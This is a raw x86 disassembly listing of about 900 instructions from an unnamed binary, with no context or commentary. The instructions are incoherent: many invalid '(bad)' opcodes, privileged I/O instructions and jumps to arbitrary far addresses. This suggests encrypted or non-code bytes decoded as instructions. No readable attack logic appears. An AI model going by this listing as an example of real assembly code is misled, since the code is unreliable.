  41468d:	mov    bl,0x7e
  41468f:	or     eax,0xbf745ede
  414694:	mov    eax,ss
  414696:	jecxz  0x41463f
  414698:	mov    esi,0xd95c021b
  41469d:	push   eax
  41469e:	xor    BYTE PTR [eax+0x7d11e7c7],bl
  4146a4:	push   edi
  4146a5:	mov    cl,BYTE PTR [ebx]
  4146a7:	jg     0x41470a
  4146a9:	adc    eax,0x16378f5e
  4146ae:	hlt    
  4146af:	fs gs test al,0x7e
  4146b3:	inc    ecx
  4146b4:	cmp    ebx,eax
  4146b6:	popf   
  4146b7:	mov    DWORD PTR [esi-0x2],ebx
  4146ba:	je     0x414669
  4146bc:	clc    
  4146bd:	mov    ah,0xda
  4146bf:	push   ecx
  4146c0:	cmp    DWORD PTR [eax+0x4661e232],0xc25cf8bd
  4146ca:	mov    bh,BYTE PTR [edx+0x4c]
  4146cd:	jbe    0x4146b9
  4146cf:	rcl    DWORD PTR [edx-0x59],0x6b
  4146d3:	mov    ebp,0x87f427f9
  4146d8:	sub    al,0xfc
  4146da:	push   edx
  4146db:	shl    dl,1
  4146dd:	test   al,0xcd
  4146df:	mov    ch,0xd
  4146e1:	adc    bh,al
  4146e3:	dec    esp
  4146e4:	cmp    BYTE PTR [eax-0xd],0x1c
  4146e8:	in     al,0x1
  4146ea:	cmp    dl,BYTE PTR [eax+0x2a]
  4146ed:	mov    ch,0x72
  4146ef:	icebp  
  4146f0:	test   eax,0xc81c7458
  4146f5:	cmp    DWORD PTR [eax],ecx
  4146f7:	jmp    FWORD PTR [ecx+0x47]
  4146fa:	stos   DWORD PTR es:[edi],eax
  4146fb:	mov    ecx,0x66832bb4
  414700:	adc    al,0x6a
  414702:	xor    BYTE PTR [esp+ebx*8],dh
  414705:	or     al,0x1a
  414707:	je     0x4146d4
  414709:	dec    eax
  41470a:	stos   BYTE PTR es:[edi],al
  41470b:	adc    eax,0x9b72486f
  414710:	mov    ds:0x9a0b2bd1,al
  414715:	jne    0x41470c
  414717:	push   esp
  414718:	and    esp,DWORD PTR [ebx-0x35962344]
  41471e:	shl    BYTE PTR [edx-0x41],1
  414721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414722:	(bad)  
  414723:	(bad)  
  414724:	sbb    DWORD PTR [ebp-0x2f],ebx
  414727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414728:	or     DWORD PTR [edi-0x67],0x3a
  41472c:	mov    bh,ch
  41472e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41472f:	in     al,0xf9
  414731:	cmp    DWORD PTR [eax-0x6671898e],edi
  414737:	inc    ebx
  414738:	into   
  414739:	retf   
  41473a:	inc    esi
  41473b:	and    ch,bl
  41473d:	xchg   edi,eax
  41473e:	dec    esp
  41473f:	add    ebx,DWORD PTR [ebx+eiz*4+0x3d]
  414743:	cld    
  414744:	mov    edx,0xbbd7edc2
  414749:	dec    ebx
  41474a:	sbb    eax,edi
  41474c:	mov    eax,es
  41474e:	sbb    al,BYTE PTR [ebp-0x68]
  414751:	mov    dl,0xa9
  414753:	outs   dx,DWORD PTR ds:[esi]
  414754:	sub    DWORD PTR [edx],0x59
  414757:	dec    eax
  414758:	mov    edi,0x5283c302
  41475d:	add    BYTE PTR [edx],0xe8
  414760:	idiv   BYTE PTR [edx+ebx*1+0x77f25ead]
  414767:	loop   0x41477c
  414769:	jns    0x4147d2
  41476b:	adc    bl,BYTE PTR [edx+0x3f]
  41476e:	dec    edi
  41476f:	pop    eax
  414770:	leave  
  414771:	fldenv [edx-0x48]
  414774:	(bad)  
  414775:	push   ds
  414776:	push   ebp
  414777:	popf   
  414778:	repnz into 
  41477a:	ss int3 
  41477c:	int3   
  41477d:	into   
  41477e:	ffree  st(7)
  414780:	inc    edi
  414781:	dec    ebp
  414782:	adc    eax,0x25320958
  414787:	xchg   DWORD PTR [ebp+0x3a9d4bb3],esp
  41478d:	add    bl,bl
  41478f:	dec    esi
  414790:	jae    0x41478c
  414792:	mov    cl,BYTE PTR [ebx-0x51ef71ec]
  414798:	jl     0x4147bf
  41479a:	enter  0xc547,0xff
  41479e:	imul   eax,DWORD PTR [edx+eax*1+0x297fc70c],0xffffffa7
  4147a6:	push   es
  4147a7:	inc    edx
  4147a8:	stos   BYTE PTR es:[edi],al
  4147a9:	outs   dx,BYTE PTR ds:[esi]
  4147aa:	sbb    BYTE PTR [ecx],ah
  4147ac:	stos   BYTE PTR es:[edi],al
  4147ad:	lds    esp,FWORD PTR [ecx+0x6cdf42d]
  4147b3:	sub    BYTE PTR [eax-0x310d66f3],cl
  4147b9:	or     eax,0x98a7ff98
  4147be:	cmp    dh,BYTE PTR [edx-0x52]
  4147c1:	mov    dh,0x40
  4147c3:	xchg   DWORD PTR [ebp-0x72bb40ef],esp
  4147c9:	lods   eax,DWORD PTR ds:[esi]
  4147ca:	(bad)  
  4147cb:	dec    ecx
  4147cc:	xchg   ebx,eax
  4147cd:	or     al,0xd0
  4147cf:	test   DWORD PTR [edi],edx
  4147d1:	in     eax,0x32
  4147d3:	loope  0x414806
  4147d5:	shr    bl,0x25
  4147d8:	inc    DWORD PTR [ebx-0x31]
  4147db:	pop    edi
  4147dc:	fisub  DWORD PTR [eax+eiz*8-0x6e]
  4147e0:	mov    ch,0xa8
  4147e2:	arpl   WORD PTR [eax],si
  4147e4:	xchg   esp,eax
  4147e5:	aad    0x66
  4147e7:	sub    esp,DWORD PTR [ebx-0x4ac9cee6]
  4147ed:	mov    esi,0xebb4888d
  4147f2:	push   ecx
  4147f3:	xor    esi,DWORD PTR [edx+0x3]
  4147f6:	push   edi
  4147f7:	(bad)  
  4147f8:	cli    
  4147f9:	mov    al,0xe8
  4147fb:	in     al,0x92
  4147fd:	push   eax
  4147fe:	and    esi,DWORD PTR [esi-0x65]
  414801:	pusha  
  414802:	mov    bl,0x3a
  414804:	rcr    DWORD PTR [edi],0x57
  414807:	jge    0x41483b
  414809:	push   ss
  41480a:	sbb    BYTE PTR [eax+0x2b],ch
  41480d:	inc    esp
  41480e:	push   cs
  41480f:	imul   ebp,DWORD PTR [edi],0x3435cdbd
  414815:	xchg   edi,eax
  414816:	dec    ebp
  414817:	mov    ds:0x6bb7d5,eax
  41481c:	lock idiv DWORD PTR [edi]
  41481f:	and    ch,ah
  414821:	xor    al,0xac
  414823:	push   ebp
  414824:	push   0xfbe2d274
  414829:	ret    
  41482a:	retf   
  41482b:	and    BYTE PTR [ebp+0x36],0xfe
  41482f:	push   eax
  414830:	add    BYTE PTR [esp+eax*1-0x50],dh
  414834:	jg     0x414871
  414836:	in     al,0x9c
  414838:	jne    0x4147da
  41483a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41483b:	and    edi,ebp
  41483d:	pushf  
  41483e:	jl     0x414822
  414840:	inc    esp
  414841:	push   ds
  414842:	jns    0x4147d4
  414844:	mov    eax,ds:0x23d54b83
  414849:	mov    BYTE PTR [eax-0x5588aa69],0x28
  414850:	jb     0x414863
  414852:	enter  0x4e69,0x8c
  414856:	add    cl,BYTE PTR [ecx+0xc0aab0c]
  41485c:	dec    eax
  41485d:	cmp    DWORD PTR [eiz*2-0x5abb286],ebp
  414864:	cmp    ah,BYTE PTR [eax-0x6a5497fc]
  41486a:	imul   esi,DWORD PTR es:[edx-0xe],0xd2397337
  414872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414873:	push   0x7f8c6faf
  414878:	dec    ecx
  414879:	loopne 0x4148a6
  41487b:	mov    al,0x3b
  41487d:	mov    ds:0xfce8b07d,al
  414882:	jecxz  0x4148bb
  414884:	inc    ebp
  414885:	arpl   WORD PTR [edx],bx
  414887:	int3   
  414888:	jge    0x414902
  41488a:	xchg   ebx,eax
  41488b:	xlat   BYTE PTR ds:[ebx]
  41488c:	sbb    esp,DWORD PTR [ebx]
  41488e:	cli    
  41488f:	pop    edi
  414890:	adc    DWORD PTR [edi+0x241ed524],edx
  414896:	mov    edx,0xd2d5997e
  41489b:	xor    bh,BYTE PTR [edi-0x66f54d70]
  4148a1:	aad    0x20
  4148a3:	xor    esi,DWORD PTR [edi-0x3d]
  4148a6:	add    DWORD PTR [esi-0x50d43b06],edi
  4148ac:	das    
  4148ad:	imul   eax,DWORD PTR [ebp+ecx*2+0x7a],0x16
  4148b2:	cld    
  4148b3:	out    dx,eax
  4148b4:	stos   DWORD PTR es:[edi],eax
  4148b5:	(bad)  
  4148b6:	shr    DWORD PTR [esi],cl
  4148b8:	sub    edi,DWORD PTR [ecx-0x3c]
  4148bb:	xor    bh,al
  4148bd:	fst    st(5)
  4148bf:	sbb    dh,BYTE PTR [eax+edi*2+0x4c8dc6d4]
  4148c6:	sub    al,0x2c
  4148c8:	jno    0x4148ef
  4148ca:	hlt    
  4148cb:	push   0xe7d8d587
  4148d0:	in     eax,dx
  4148d1:	in     eax,0xb
  4148d3:	imul   ebx,DWORD PTR [ebx],0x358ace6a
  4148d9:	ja     0x4148ad
  4148db:	jle    0x4148bc
  4148dd:	sbb    BYTE PTR [ebp+0x153652c6],cl
  4148e3:	fcmovne st,st(6)
  4148e5:	lahf   
  4148e6:	sub    dh,BYTE PTR [ebx]
  4148e8:	sbb    DWORD PTR [ebx],ebp
  4148ea:	mov    ebx,0x15b026c5
  4148ef:	sub    dl,dl
  4148f1:	retf   0xeccc
  4148f4:	test   al,0x89
  4148f7:	neg    edi
  4148f9:	in     al,0xb7
  4148fb:	cwde   
  4148fc:	push   ecx
  4148fd:	loopne 0x41490b
  4148ff:	or     al,0x4b
  414901:	xor    bh,BYTE PTR [ecx-0x2639f331]
  414907:	not    DWORD PTR [ebx]
  414909:	sti    
  41490a:	pushf  
  41490b:	dec    edx
  41490c:	daa    
  41490d:	scas   al,BYTE PTR es:[edi]
  41490e:	fwait
  41490f:	and    ebx,ebx
  414911:	(bad)  
  414912:	or     al,0x97
  414914:	popf   
  414915:	call   0x3f11b690
  41491a:	jno    0x4148e6
  41491c:	adc    eax,0x10a2ea1b
  414921:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414923:	in     eax,0xec
  414925:	add    al,0x25
  414927:	push   ds
  414928:	sbb    al,ah
  41492a:	cmp    DWORD PTR [edi],ecx
  41492c:	sbb    ecx,DWORD PTR [esi]
  41492e:	repz ret 0x19c0
  414932:	mov    cs,edi
  414934:	push   ds
  414935:	add    bl,BYTE PTR [ebx]
  414937:	push   esi
  414938:	push   esp
  414939:	pop    edx
  41493a:	pop    ds
  41493b:	adc    al,0x44
  41493d:	(bad)  
  41493e:	cmp    DWORD PTR [esi+ebx*1-0x38],edx
  414942:	and    ebp,DWORD PTR [edx+0x1297fd7b]
  414948:	fs fisubr DWORD PTR es:[eax+0x5f]
  41494d:	pop    esi
  41494e:	sbb    dl,BYTE PTR [esi+0x35b545f5]
  414954:	xchg   esp,eax
  414955:	fild   DWORD PTR [esi]
  414957:	and    BYTE PTR [ecx-0x35b5e725],dl
  41495d:	fcomp  QWORD PTR [eax-0x3afd9e2c]
  414963:	mov    bh,0xb3
  414965:	cli    
  414966:	cmp    BYTE PTR [edx+0x6c],dl
  414969:	in     al,0x8c
  41496b:	je     0x4149b9
  41496d:	sar    BYTE PTR [ebx],1
  41496f:	popa   
  414970:	jecxz  0x414986
  414972:	xchg   ecx,eax
  414973:	lods   al,BYTE PTR ds:[esi]
  414974:	mov    ds:0xc9d739d2,al
  414979:	cmp    al,0x9b
  41497b:	push   ebx
  41497c:	call   0x3b39:0x44f53d6d
  414983:	push   esi
  414984:	jp     0x41498b
  414986:	jmp    0xa119:0xd02cebea
  41498d:	call   0x5c7758cd
  414992:	mov    esp,0xe4366ec4
  414997:	je     0x4149fc
  414999:	or     eax,0xda3bcfd7
  41499e:	ret    0xf319
  4149a1:	std    
  4149a2:	adc    ch,dh
  4149a4:	lea    ecx,[edi]
  4149a6:	xor    DWORD PTR [ebx+0x3],ecx
  4149a9:	aam    0x69
  4149ab:	icebp  
  4149ac:	push   0x5cfe678e
  4149b1:	es mov edi,0x6d2248b7
  4149b7:	clc    
  4149b8:	add    eax,DWORD PTR [esi]
  4149ba:	push   esi
  4149bb:	mov    al,0xa7
  4149bd:	ficom  DWORD PTR [ebx]
  4149bf:	into   
  4149c0:	adc    al,0x62
  4149c2:	out    0xa9,al
  4149c4:	iret   
  4149c5:	mov    eax,DWORD PTR [ecx]
  4149c7:	in     al,0x5c
  4149c9:	ins    DWORD PTR es:[edi],dx
  4149ca:	and    eax,0xec86732
  4149cf:	or     eax,DWORD PTR [ebp-0x28]
  4149d2:	dec    esp
  4149d3:	jle    0x414989
  4149d5:	repz out dx,al
  4149d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149d8:	jmp    0x41499e
  4149da:	bnd cs jle 0x4149cd
  4149de:	stos   DWORD PTR es:[edi],eax
  4149df:	enter  0xc5b8,0xfb
  4149e3:	inc    ecx
  4149e4:	adc    ch,BYTE PTR [ebx]
  4149e6:	clc    
  4149e7:	or     eax,0x13ab9314
  4149ec:	or     eax,0x5270f986
  4149f1:	or     al,0x64
  4149f3:	pop    edi
  4149f4:	jo     0x4149a2
  4149f6:	sub    edi,esp
  4149f8:	fsubr  st,st(7)
  4149fa:	sub    BYTE PTR [ecx+esi*2],dh
  4149fd:	mov    ds:0x8b2f1c81,al
  414a02:	cld    
  414a03:	mov    al,ds:0xaf428aa
  414a08:	xor    al,0xfc
  414a0a:	jnp    0x4149f4
  414a0c:	(bad)  
  414a0d:	mov    ebp,0x38549315
  414a12:	or     eax,0xe7c83e25
  414a17:	xchg   edi,eax
  414a18:	outs   dx,BYTE PTR ds:[esi]
  414a19:	arpl   WORD PTR [edx-0x8],sp
  414a1c:	or     dl,ch
  414a1e:	mov    ebp,0xd6321dbb
  414a23:	loope  0x4149da
  414a25:	or     esi,ebp
  414a27:	adc    al,0x3d
  414a29:	stos   DWORD PTR es:[edi],eax
  414a2a:	les    edx,FWORD PTR [edx+eiz*1+0x26]
  414a2e:	adc    ah,ch
  414a30:	or     eax,0x5ea48e73
  414a35:	pop    ds
  414a36:	sbb    al,0xf1
  414a38:	je     0x414a1e
  414a3a:	push   edi
  414a3b:	or     DWORD PTR [ecx+0x7b],edx
  414a3e:	cmp    bh,BYTE PTR [esi+0x1e]
  414a41:	mov    cs,ebp
  414a43:	cli    
  414a44:	jnp    0x414a34
  414a46:	aas    
  414a47:	fst    QWORD PTR [ebx]
  414a49:	and    ebx,DWORD PTR [edx+0x16a0a21e]
  414a4f:	bnd jp 0x414a92
  414a52:	mov    ch,bl
  414a54:	pop    edx
  414a55:	adc    al,BYTE PTR [ebx+edx*1+0x3fd00bb]
  414a5c:	lods   al,BYTE PTR ds:[esi]
  414a5d:	int    0x20
  414a5f:	call   0x698e:0xc32194c0
  414a66:	mov    al,ds:0x5a5d799f
  414a6b:	push   ss
  414a6c:	mov    DWORD PTR [edi],0xc4138730
  414a72:	in     eax,dx
  414a73:	inc    BYTE PTR [eax+edx*8+0x60]
  414a77:	xor    eax,0xe692dfdd
  414a7c:	fsubr  st,st(6)
  414a7e:	into   
  414a7f:	and    eax,0xd7e65700
  414a84:	mov    edx,0x38fac4a4
  414a89:	pop    edx
  414a8a:	mov    bh,BYTE PTR [ebp+0x34]
  414a8d:	stos   BYTE PTR es:[edi],al
  414a8e:	enter  0x8495,0x66
  414a92:	std    
  414a93:	outs   dx,BYTE PTR ds:[esi]
  414a94:	push   esi
  414a95:	xchg   edi,eax
  414a96:	call   0x795b4bd8
  414a9b:	mov    ah,0xb2
  414a9d:	pusha  
  414a9e:	test   eax,0xacd13d5e
  414aa3:	pop    edx
  414aa4:	cmp    DWORD PTR [edi+ebx*1+0x34],ebx
  414aa8:	pop    ss
  414aa9:	mov    eax,0xfef8f7ae
  414aae:	not    BYTE PTR [edi-0x75b584c3]
  414ab4:	cmp    DWORD PTR [ecx+0x6f487a90],0xffffffb2
  414abb:	or     dh,dl
  414abd:	fs or  cl,dh
  414ac0:	mov    eax,ds:0xf15869d3
  414ac5:	push   ebx
  414ac6:	jne    0x414a83
  414ac8:	cmc    
  414ac9:	sbb    al,0xaa
  414acb:	rcr    BYTE PTR [edx+0x24859dac],0xf
  414ad2:	push   edi
  414ad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ad4:	repz jne 0x1c4c12c4
  414adb:	repnz add eax,0x86f7c47c
  414ae1:	inc    esp
  414ae2:	bound  esi,QWORD PTR ds:0x54b9cc50
  414ae8:	gs sbb eax,0x73300a7e
  414aee:	aaa    
  414aef:	out    0xa7,eax
  414af1:	jp     0x414b4f
  414af3:	push   ebp
  414af4:	inc    edi
  414af5:	stc    
  414af6:	mov    ch,0x33
  414af8:	aaa    
  414af9:	inc    esi
  414afa:	push   esi
  414afb:	mov    gs,WORD PTR [eax+0x3538a377]
  414b01:	mov    edi,0x87adec5e
  414b06:	mov    eax,0xb3f4e2a2
  414b0b:	xor    eax,0x6dea46f2
  414b10:	popa   
  414b11:	adc    eax,DWORD PTR [ecx-0xa]
  414b14:	mov    edx,0xb16a633e
  414b19:	push   esp
  414b1a:	sti    
  414b1b:	loope  0x414b14
  414b1d:	mov    dh,0xec
  414b1f:	inc    ebx
  414b20:	aad    0x36
  414b22:	xchg   ebp,eax
  414b23:	pop    es
  414b24:	loopne 0x414b91
  414b26:	or     DWORD PTR [esi],eax
  414b28:	xchg   ebp,eax
  414b29:	idiv   bh
  414b2b:	mov    ebx,es
  414b2d:	(bad)  
  414b2f:	in     eax,0xc6
  414b31:	pop    es
  414b32:	or     al,0xf1
  414b34:	es dec edi
  414b36:	sub    al,0x35
  414b38:	adc    DWORD PTR [ebp+ebx*2-0x61bd8cec],0xaf41b5e
  414b43:	fisubr DWORD PTR [edi-0x780c888e]
  414b49:	shr    DWORD PTR [si],1
  414b4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b4d:	(bad)  
  414b4f:	ds xor al,0x6f
  414b52:	mov    al,ds:0x67fe75e0
  414b57:	not    DWORD PTR [edx+esi*1-0x68]
  414b5b:	popf   
  414b5c:	js     0x414b92
  414b5e:	cmp    dl,BYTE PTR [ecx]
  414b60:	add    bl,BYTE PTR [edi-0x3d0bb905]
  414b66:	je     0x414bb9
  414b68:	cdq    
  414b69:	and    al,0xf1
  414b6b:	xor    eax,0x39d9bf24
  414b70:	repnz in eax,dx
  414b72:	or     edi,ebp
  414b74:	in     eax,0xab
  414b76:	mov    ds:0xdc297956,eax
  414b7b:	sub    al,dl
  414b7d:	push   ds
  414b7e:	repnz shl DWORD PTR [edi+0x7b905ff],1
  414b85:	nop
  414b86:	outs   dx,BYTE PTR ds:[esi]
  414b87:	loope  0x414bfd
  414b89:	sbb    al,0xb2
  414b8b:	rcr    ecx,cl
  414b8d:	cdq    
  414b8e:	(bad)  
  414b8f:	adc    DWORD PTR [ebx+ecx*4-0x1877ea5e],edx
  414b96:	mov    eax,0xe10ec925
  414b9b:	jmp    0x90c2:0x69aa2f6
  414ba2:	mov    eax,ds:0x31f66086
  414ba7:	stc    
  414ba8:	cs das 
  414baa:	ins    DWORD PTR es:[edi],dx
  414bab:	inc    ebx
  414bac:	adc    edi,DWORD PTR [ebx-0x69]
  414baf:	xor    dl,BYTE PTR [edx-0x439d5794]
  414bb5:	repnz sub DWORD PTR ss:[esi-0x13a2e37d],esi
  414bbd:	add    BYTE PTR [ebx],cl
  414bbf:	pop    ds
  414bc0:	stc    
  414bc1:	jp     0x414c1a
  414bc3:	fsubr  DWORD PTR [edi+0x44791f08]
  414bc9:	not    BYTE PTR [eax]
  414bcb:	(bad)  
  414bcc:	in     eax,0xcc
  414bce:	mov    ch,0xca
  414bd0:	and    esi,esp
  414bd2:	add    DWORD PTR [edx+0x157f3d5e],edi
  414bd8:	push   ss
  414bd9:	(bad)  
  414bda:	or     al,0x5a
  414bdc:	mov    ebp,0x9f658e96
  414be1:	out    dx,eax
  414be2:	enter  0x38c9,0xdb
  414be6:	sbb    al,dl
  414be8:	adc    ch,BYTE PTR [eax]
  414bea:	aaa    
  414beb:	push   edi
  414bec:	scas   eax,DWORD PTR es:[edi]
  414bed:	xor    BYTE PTR [edi-0x3c],al
  414bf0:	cli    
  414bf1:	xchg   esp,eax
  414bf2:	arpl   WORD PTR [edx+edi*8+0xb],dx
  414bf6:	in     eax,0xa1
  414bf8:	mov    DWORD PTR [ebp-0x15],edx
  414bfb:	rcl    BYTE PTR ds:0x8832730e,cl
  414c01:	fldenv [edi+0x473b4593]
  414c07:	jnp    0x414be6
  414c09:	and    esi,DWORD PTR [ecx]
  414c0b:	dec    esi
  414c0c:	jg     0x414c20
  414c0e:	dec    ebx
  414c0f:	jns    0x414bf1
  414c11:	loope  0x414bcd
  414c13:	hlt    
  414c14:	outs   dx,DWORD PTR ds:[esi]
  414c15:	sub    DWORD PTR [ecx+0x4a7aaf9e],edx
  414c1b:	stos   DWORD PTR es:[edi],eax
  414c1c:	pusha  
  414c1d:	jmp    0x414c81
  414c1f:	arpl   WORD PTR [edx-0x51],ax
  414c22:	mov    al,0x66
  414c24:	dec    ecx
  414c25:	push   0x9db7e30c
  414c2a:	jnp    0x414c1e
  414c2c:	jne    0x414bc8
  414c2e:	sbb    ebp,DWORD PTR [ebp-0x5e]
  414c31:	stc    
  414c32:	in     al,dx
  414c33:	fsub   QWORD PTR [edi-0x4cdd365]
  414c39:	cli    
  414c3a:	aas    
  414c3b:	sbb    DWORD PTR [esi],esi
  414c3d:	inc    ebx
  414c3e:	push   esp
  414c3f:	sbb    edi,ebp
  414c41:	jmp    0xab6a:0x4a577dc8
  414c48:	lahf   
  414c49:	inc    eax
  414c4a:	sbb    bl,ah
  414c4c:	or     al,0x14
  414c4e:	scas   eax,DWORD PTR es:[edi]
  414c4f:	mov    eax,ds:0xe3a590b8
  414c54:	scas   al,BYTE PTR es:[edi]
  414c55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c56:	out    dx,eax
  414c57:	loop   0x414c62
  414c59:	jle    0x414c21
  414c5b:	add    cl,0x30
  414c5e:	scas   eax,DWORD PTR es:[edi]
  414c5f:	enter  0xb69b,0x8a
  414c63:	repnz sub ebx,DWORD PTR [eax]
  414c66:	mov    bl,0x47
  414c68:	scas   al,BYTE PTR es:[edi]
  414c69:	outs   dx,DWORD PTR ds:[esi]
  414c6a:	jmp    0x7ce9:0xa4f4b0f
  414c71:	sbb    al,0xa5
  414c73:	sbb    cl,BYTE PTR [edi+0x7]
  414c76:	call   0xbcd83dc3
  414c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c7c:	(bad)  [ebx-0xc124b4b]
  414c82:	jle    0x414c2f
  414c84:	pop    ecx
  414c85:	inc    edx
  414c86:	fisttp DWORD PTR [eax]
  414c88:	and    BYTE PTR [eax-0x44],bh
  414c8b:	inc    esp
  414c8c:	mov    WORD PTR [edx],es
  414c8e:	xchg   esp,eax
  414c8f:	iret   
  414c90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c91:	jmp    0x5a9f:0xbc605a1e
  414c98:	sbb    eax,0xcc07371e
  414c9d:	mov    edx,esp
  414c9f:	pop    esi
  414ca0:	imul   edi,DWORD PTR [esi+0x111a8992],0xffffffdc
  414ca7:	imul   ecx,DWORD PTR [edx],0xfe88d457
  414cad:	lock int 0xcd
  414cb0:	xor    eax,0x54b0d527
  414cb5:	pusha  
  414cb6:	ret    0x446d
  414cb9:	cmove  eax,DWORD PTR [esi+eax*8+0x2af771f4]
  414cc1:	xchg   ecx,eax
  414cc2:	test   DWORD PTR [esi-0x6],eax
  414cc5:	xor    eax,DWORD PTR [edx+eiz*2-0x50]
  414cc9:	fild   WORD PTR [ebx+0x13]
  414ccc:	std    
  414ccd:	mov    bl,0xb2
  414ccf:	push   ss
  414cd0:	mov    dl,0x8d
  414cd2:	pop    ds
  414cd3:	scas   eax,DWORD PTR es:[edi]
  414cd4:	fistp  WORD PTR [eax+0x36]
  414cd7:	ss push ebx
  414cd9:	jmp    0x3671d115
  414cde:	out    dx,al
  414cdf:	call   0xbd66:0x802f0cf1
  414ce6:	xor    bh,BYTE PTR [eax-0x46]
  414ce9:	fisttp QWORD PTR [ebx]
  414ceb:	int3   
  414cec:	mov    edx,0xf12fa744
  414cf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cf2:	call   0x92b894c7
  414cf7:	mov    cl,BYTE PTR [eax+ebp*1-0xe143cda]
  414cfe:	into   
  414cff:	gs xchg ecx,eax
  414d01:	mov    ds:0x9893f028,eax
  414d06:	cld    
  414d07:	fwait
  414d08:	mov    bh,0x2c
  414d0a:	mov    ebp,0xd9df11c7
  414d0f:	popa   
  414d10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d11:	popa   
  414d12:	mov    cl,0x11
  414d14:	cdq    
  414d15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d16:	shr    DWORD PTR [ebp+0x2ce2f685],cl
  414d1c:	mov    gs,WORD PTR [ebx]
  414d1e:	xchg   esp,eax
  414d1f:	xor    ebx,DWORD PTR [esi+esi*1-0x2f]
  414d23:	jle    0x414d1d
  414d25:	pop    edi
  414d26:	adc    BYTE PTR [ecx-0x3d],0x23
  414d2a:	pop    ds
  414d2b:	jbe    0x414cdb
  414d2d:	ja     0x414d39
  414d2f:	iret   
  414d30:	sub    esp,DWORD PTR ds:[esi+0x5e]
  414d34:	xchg   edx,eax
  414d35:	or     ch,al
  414d37:	sbb    al,dl
  414d39:	pop    ss
  414d3a:	pop    edx
  414d3b:	stc    
  414d3c:	push   edi
  414d3d:	xchg   BYTE PTR [esp+edx*2-0x54],dl
  414d41:	push   esi
  414d42:	jl     0x414d9d
  414d44:	pop    ebx
  414d45:	ret    0x5f89
  414d48:	and    al,0xb6
  414d4a:	je     0x414d9a
  414d4c:	inc    ebp
  414d4d:	cmp    ebp,DWORD PTR [ebx-0x27d390f2]
  414d53:	dec    ebx
  414d54:	int3   
  414d55:	pop    esi
  414d56:	dec    edx
  414d57:	int3   
  414d58:	das    
  414d59:	mov    ecx,0x1635e919
  414d5e:	aaa    
  414d5f:	add    esp,DWORD PTR [ebx]
  414d61:	popf   
  414d62:	fwait
  414d63:	lea    esp,[ebp+0x34]
  414d66:	xchg   BYTE PTR [eax],al
  414d68:	test   ebx,ebx
  414d6a:	sbb    cl,BYTE PTR [ebp+0x57]
  414d6d:	pop    ecx
  414d6e:	ins    DWORD PTR es:[edi],dx
  414d6f:	pop    esi
  414d70:	ja     0x414d1f
  414d72:	jg     0x414d5e
  414d74:	loop   0x414de1
  414d76:	fwait
  414d77:	retf   0x7dfc
  414d7a:	dec    edi
  414d7b:	nop
  414d7c:	xchg   esi,eax
  414d7d:	call   0x106:0xe3697f31
  414d84:	add    edx,DWORD PTR [eax+ebx*2-0x27]
  414d88:	mov    fs,edx
  414d8a:	jle    0x414d72
  414d8c:	pop    esp
  414d8d:	es dec esi
  414d8f:	cdq    
  414d90:	fadd   QWORD PTR [ebp-0x51]
  414d93:	adc    BYTE PTR [esp+edi*4+0x63e1f64a],ah
  414d9a:	adc    al,0xcf
  414d9c:	ficomp DWORD PTR [ebx-0x47]
  414d9f:	mov    esi,0xb271f2a6
  414da4:	clc    
  414da5:	sbb    DWORD PTR [esi-0x22f83e08],edi
  414dab:	test   dh,ch
  414dad:	jne    0x414d86
  414daf:	inc    eax
  414db0:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414db2:	retf   
  414db3:	jae    0x414da5
  414db5:	in     al,dx
  414db6:	mov    DWORD PTR [eax],0xe2be454a
  414dbc:	jecxz  0x414d96
  414dbe:	pop    es
  414dbf:	sti    
  414dc0:	data16 sub BYTE PTR gs:[ebx+ecx*4],0x53
  414dc6:	popf   
  414dc7:	ret    
  414dc8:	(bad)  [ecx+0x47]
  414dcb:	into   
  414dcc:	jmp    0x7920c8a4
  414dd1:	into   
  414dd2:	or     DWORD PTR [edi+0x55],esp
  414dd5:	push   ebx
  414dd6:	dec    DWORD PTR [ecx+0x756109bd]
  414ddc:	push   cs
  414ddd:	dec    ecx
  414dde:	lds    edi,FWORD PTR ss:[ecx+0x30c8e4b7]
  414de5:	sahf   
  414de6:	mov    ds:0x3eb12764,al
  414deb:	arpl   WORD PTR [ecx-0x72],sp
  414dee:	jle    0x414de3
  414df0:	ins    DWORD PTR es:[edi],dx
  414df1:	xor    al,0x22
  414df3:	jns    0x414da9
  414df5:	cs sbb eax,0xed8c93e1
  414dfb:	xor    DWORD PTR [ebp-0x51],ebp
  414dfe:	mov    BYTE PTR [ebp+0x65794fd8],bl
  414e04:	mov    eax,ds:0x8e036bc7
  414e09:	dec    edi
  414e0a:	cmp    BYTE PTR [ebp-0x9],bh
  414e0d:	mov    BYTE PTR [esi-0x65],bl
  414e10:	dec    ebp
  414e11:	cmp    DWORD PTR [edx+edi*8+0x2e],0xffffffb1
  414e16:	stc    
  414e17:	cs test al,0x64
  414e1b:	nop
  414e1c:	in     eax,0xd4
  414e1e:	pushf  
  414e1f:	pop    edi
  414e20:	mov    ah,0x32
  414e22:	fs jb  0x414e9e
  414e25:	jl     0x414e8e
  414e27:	fbstp  TBYTE PTR [edi]
  414e29:	fisttp QWORD PTR [edx]
  414e2b:	fbstp  TBYTE PTR [ebp+0x3]
  414e2e:	ds (bad) 
  414e30:	and    ebx,DWORD PTR [eax-0x6f]
  414e33:	les    esp,FWORD PTR [eax-0x12645c2d]
  414e39:	or     eax,0x98cd9e79
  414e3e:	cld    
  414e3f:	cmp    al,BYTE PTR [ebx-0x41]
  414e42:	mov    eax,0x19e791a5
  414e47:	les    eax,FWORD PTR [ecx-0x772dadb5]
